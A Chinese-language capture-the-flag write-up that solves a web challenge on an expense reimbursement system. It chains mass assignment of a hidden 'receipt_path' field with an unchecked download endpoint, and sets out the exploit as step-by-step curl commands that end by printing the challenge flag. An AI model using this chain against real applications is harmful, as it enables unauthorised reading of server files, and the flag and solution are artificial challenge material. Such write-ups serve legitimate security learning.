## 题目原文

> 公司最近上线了“企业级电子报销系统”以无纸化办公。研发团队称系统非常安全，没有漏洞。请你验证他们的说法。flag位于：`/challenge/flag.txt`。

题面直接给了 flag 路径，所以目标是「任意文件读」而不是拿 shell。

## 题解

### 入口与指纹

`Apache/2.4.65 (Debian)` + `PHP/8.1.34`。首页是统一认证，`action=register|login` 走同一个 `index.php`，登录后跳 `dashboard.php`。

工作台有三个功能：

| 功能 | 接口 |
| --- | --- |
| 列表 | `api/list_tickets.php` |
| 新建报销 | `api/create_ticket.php`（multipart，含 `receipt` 文件） |
| 完善草稿 | `api/get_ticket.php?id=` + `api/update_ticket.php?id=` |
| 下载凭证 | `download.php?id=` |

另外还有一个 `api/suggest_category.php?q=` 的自动补全接口。

### 关键观察

**1. 页面 JS 注释把隐藏字段写出来了。**

`dashboard.php` 的内联脚本里有一段注释，直接点名了 `receipt_path`：

```js
function editDraft(id) {
    fetch('api/get_ticket.php?id=' + id)
    ...
    // 此时攻击者如果按 F12 抓包查看 get_ticket 的响应，就会发现
    // "receipt_path": "/var/www/html/uploads/xxxxx.jpg"
    // 从而意识到有个系统字段叫做 receipt_path
}
```

新建报销时只提交 `title/amount/description/receipt`，而**详情接口会把 `receipt_path` 一起返回**——说明它是数据库里的真实字段。

**2. `update_ticket.php` 是「增量更新」，不校验字段名。**

前端只传 `title`、`amount`、`receipt` 三个字段，但后端按「有则更新」处理。多传一个 `receipt_path` 就会被写库：

```json
POST api/update_ticket.php?id=2
title=t1&amount=1&receipt_path=/challenge/flag.txt
→ {"status":"success","msg":"Draft updated successfully."}
```

再查详情，`receipt_path` 已经变成目标路径。

**3. `download.php?id=` 直接按 `receipt_path` 读文件。**

下载接口没有对路径做任何限制（不像 `basename()` 或白名单），传什么路径读什么路径。

**4. `suggest_category.php` 是干扰项。**

JS 里自己写着 `// Fake autocompletion to simulate Rabbit Hole 1 (SQLi)`——这个接口是假的 SQLi 诱饵，不要在它上面浪费时间。

### 利用链

**Step 1：注册、登录。**

```bash
T=10.0.0.0   # 本例地址已失效
curl -s -c cj -X POST -d 'action=register&username=u8&password=pass1234' "http://$T/"
curl -s -c cj -b cj -X POST -d 'action=login&username=u8&password=pass1234' "http://$T/"
# 302 → dashboard.php
```

**Step 2：建一张报销单，拿到 id 和真实的 `receipt_path`。**

```bash
printf 'demo' > r.txt
curl -s -b cj -X POST \
  -F 'title=t1' -F 'amount=1' -F 'description=d' \
  -F 'receipt=@r.txt;type=image/jpeg;filename=r.jpg' \
  "http://$T/api/create_ticket.php"
# {"status":"success","ticket_id":"2"}

curl -s -b cj "http://$T/api/get_ticket.php?id=2"
# {"data":{"id":2,...,"receipt_path":"/var/www/html/uploads/ad28...jpg"}}
```

**Step 3：增量更新，把 `receipt_path` 改成 flag 路径。**

```bash
curl -s -b cj -X POST \
  -F 'title=t1' -F 'amount=1' -F 'receipt_path=/challenge/flag.txt' \
  "http://$T/api/update_ticket.php?id=2"
# {"status":"success","msg":"Draft updated successfully."}
```

**Step 4：下载。**

```bash
curl -s -b cj "http://$T/download.php?id=2"
# flag{ab5c090a-d4db-45be-8b29-5e2914ef10de}
```

### flag 位置

| flag | 位置 |
| --- | --- |
| 1 | `/challenge/flag.txt`，通过改写 `receipt_path` 后从 `download.php` 读取 |

### 复盘

- **「增量更新」接口天然容易 mass assignment。** 前端只发三个字段，后端按字段名更新，多传一个内部字段就能改它；判断方法是看 `get` 响应里有没有前端表单没提交的字段。
- **响应字段是攻击面的目录。** `receipt_path` 在详情接口里露出来，说明它可写、会被下游使用；顺着它的消费方（`download.php`）就能闭环。
- **页面注释要读。** 本题的 JS 注释把「隐藏字段叫 `receipt_path`」直接写出来了，还标注了 `Rabbit Hole 1 (SQLi)` 是假的。
- **拿到明确 flag 路径时，优先找文件读而不是 shell。** 改一个路径字段比拿 RCE 便宜得多。
- **别在标注为诱饵的接口上耗时间。** `suggest_category.php` 的 SQLi 是作者放的干扰项。
